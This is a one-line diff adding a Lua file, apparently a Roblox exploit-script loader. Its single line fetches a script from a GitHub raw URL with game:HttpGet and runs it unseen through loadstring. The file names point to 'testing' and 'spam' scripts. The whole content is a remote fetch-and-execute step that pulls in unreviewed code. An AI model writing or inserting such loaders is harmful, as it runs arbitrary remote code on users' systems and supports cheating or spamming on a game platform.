@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/kukirin-life-testing-spam7-5ziqml5gl2ce6w.lua"))()
